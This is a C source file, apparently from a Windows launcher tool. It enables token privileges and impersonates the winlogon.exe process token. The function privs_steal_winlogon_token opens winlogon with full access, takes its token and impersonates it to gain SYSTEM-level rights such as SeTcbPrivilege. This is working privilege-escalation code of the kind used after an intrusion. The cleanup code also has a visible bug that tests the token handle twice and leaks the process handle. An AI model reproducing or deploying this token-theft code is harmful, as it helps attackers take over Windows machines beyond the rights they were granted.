#include "launcher/privileges.h"
#include "utils/alloc.h"
#include "utils/error.h"
#include <Windows.h>
#include <errhandlingapi.h>
#include <handleapi.h>
#include <minwindef.h>
#include <oaidl.h>
#include <processthreadsapi.h>
#include <securitybaseapi.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include <winnt.h>

bool privs_enable_privilege(LPCSTR privilege_name)
{
    HANDLE current_process_token = nullptr;
    TOKEN_PRIVILEGES *token_privileges = nullptr;
    char *current_privilege_name = nullptr;
    LUID_AND_ATTRIBUTES current_privilege = {0};
    TOKEN_PRIVILEGES new_privilege = {0};
    uint32_t current_privilege_name_len = 0;
    uint32_t token_privileges_length = 0;
    bool status = false, target_privilege_found = false;
    BOOL result = FALSE;

    result = OpenProcessToken(
        GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &current_process_token
    );
    if (result == FALSE)
    {
        LOG_ERROR("Failed getting current process' token handle. Error: %ld\n", GetLastError());
        goto cleanup;
    }

    result = GetTokenInformation(
        current_process_token,
        TokenPrivileges,
        NULL,
        0,
        (PDWORD)&token_privileges_length
    );
    if (result != FALSE || GetLastError() != ERROR_INSUFFICIENT_BUFFER)
    {
        LOG_ERROR("Unexpected returned value for GetTokenInformation.\n");
        goto cleanup;
    }

    token_privileges = jalloc((size_t)token_privileges_length);
    if (token_privileges == nullptr)
    {
        LOG_ERROR("Failed allocating memory.\n");
        goto cleanup;
    }

    result = GetTokenInformation(
        current_process_token,
        TokenPrivileges,
        token_privileges,
        token_privileges_length,
        (PDWORD)&token_privileges_length
    );
    if (result == FALSE)
    {
        LOG_ERROR(
            "Unexpected result while getting token informations. Error: %ld\n",
            GetLastError()
        );
        goto cleanup;
    }

    for (uint32_t i = 0; i < token_privileges->PrivilegeCount; i++)
    {
        current_privilege_name_len = 0;
        current_privilege = token_privileges->Privileges[i];
        result = LookupPrivilegeNameA(
            nullptr,
            &(current_privilege.Luid),
            nullptr,
            (LPDWORD)&current_privilege_name_len
        );
        if (result != FALSE || GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            LOG_ERROR("Failed retreiving privilege name length.\n");
            goto cleanup;
        }

        current_privilege_name =
            jrealloc(current_privilege_name, (size_t)current_privilege_name_len + 1);
        if (current_privilege_name == nullptr)
        {
            LOG_ERROR("Failed allocating memory.\n");
            goto cleanup;
        }

        result = LookupPrivilegeNameA(
            nullptr,
            &(current_privilege.Luid),
            current_privilege_name,
            (LPDWORD)&current_privilege_name_len
        );
        if (result == FALSE)
        {
            LOG_ERROR("Failed retreiving privilege name.\n");
            goto cleanup;
        }

        target_privilege_found = (strcmp(current_privilege_name, privilege_name) == 0);
        if (target_privilege_found == true)
        {
            LOG_SUCCESS("Enabling %s privilege.\n", privilege_name);
            new_privilege.PrivilegeCount = 1;
            new_privilege.Privileges[0].Luid = current_privilege.Luid;
            new_privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            result = AdjustTokenPrivileges(
                current_process_token,
                FALSE,
                &new_privilege,
                sizeof(new_privilege),
                nullptr,
                nullptr
            );
            if (result == FALSE)
            {
                LOG_ERROR(
                    "Failed enabling %s. GetLastError: %ld\n",
                    privilege_name,
                    GetLastError()
                );
                goto cleanup;
            }

            break;
        }
    }

    if (target_privilege_found == false)
        LOG_ERROR("Failed enabling privilege %s.\n", privilege_name);

    status = target_privilege_found;

cleanup:
    jfree(current_privilege_name);
    jfree(token_privileges);

    return status;
}

bool privs_steal_winlogon_token()
{
    PROCESSENTRY32 current_process = {0};
    BOOL result = FALSE;
    bool status = false;
    HANDLE snapshot = nullptr, winlogon_handle = nullptr, winlogon_token = nullptr;

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
    {
        LOG_ERROR("Failed creating snapshot of processes. GetLastError(): %ld\n", GetLastError());
        goto cleanup;
    }

    current_process.dwSize = sizeof(PROCESSENTRY32);
    result = Process32First(snapshot, &current_process);
    if (result == FALSE)
    {
        LOG_ERROR("Failed getting first process of snapshot. GetLastError: %ld\n", GetLastError());
        goto cleanup;
    }

    do
    {
        if (_stricmp(current_process.szExeFile, "winlogon.exe") == 0)
        {
            LOG_SUCCESS("Found winlogon.exe. PID %ld.\n", current_process.th32ProcessID);
            status = true;
            break;
        }

        result = Process32Next(snapshot, &current_process);
    } while (result != FALSE);

    if (status == false)
    {
        LOG_ERROR("Could not find winlogon.exe process.\n");
        goto cleanup;
    }

    winlogon_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, current_process.th32ProcessID);
    if (winlogon_handle == nullptr)
    {
        LOG_ERROR("Failed opening handle to winlogon.exe. GetLastError: %ld\n", GetLastError());
        goto cleanup;
    }

    result = OpenProcessToken(winlogon_handle, TOKEN_QUERY | TOKEN_DUPLICATE, &winlogon_token);
    if (result == FALSE)
    {
        LOG_ERROR("Failed getting winlogon token. GetLastError(): %ld\n", GetLastError());
        goto cleanup;
    }

    result = ImpersonateLoggedOnUser(winlogon_token);
    if (result == FALSE)
    {
        LOG_ERROR("Failed impersonnating winlogon. GetLastError(): %ld\n", GetLastError());
        goto cleanup;
    }

    LOG_SUCCESS("Succesfully impersonated WinLogon. We now have SeTcbPrivilege.\n");
    status = true;

cleanup:
    if (winlogon_token != nullptr)
        CloseHandle(winlogon_token);
    if (winlogon_token != nullptr)
        CloseHandle(winlogon_handle);
    if (snapshot != INVALID_HANDLE_VALUE && snapshot != nullptr)
        CloseHandle(snapshot);

    return status;
}

bool privs_revert_impersonation()
{
    RevertToSelf();

    return true;
}